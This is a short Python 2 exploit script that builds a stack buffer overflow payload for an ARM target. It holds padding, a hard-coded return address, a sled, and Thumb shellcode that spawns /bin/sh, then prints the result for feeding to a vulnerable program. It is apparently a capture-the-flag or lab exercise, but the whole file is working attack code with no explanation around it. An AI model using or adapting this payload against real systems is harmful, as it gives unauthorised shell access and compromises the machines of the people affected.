#!/usr/bin/env python2

from __future__ import print_function
import struct

p=lambda x: struct.pack("<I",x)

offset=68

shellcode=b"\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x41"

nopsled=b"\x2d\x46"*512
payload = "A"*offset+p(0x7efff6c8+1)+nopsled+shellcode
print(payload)
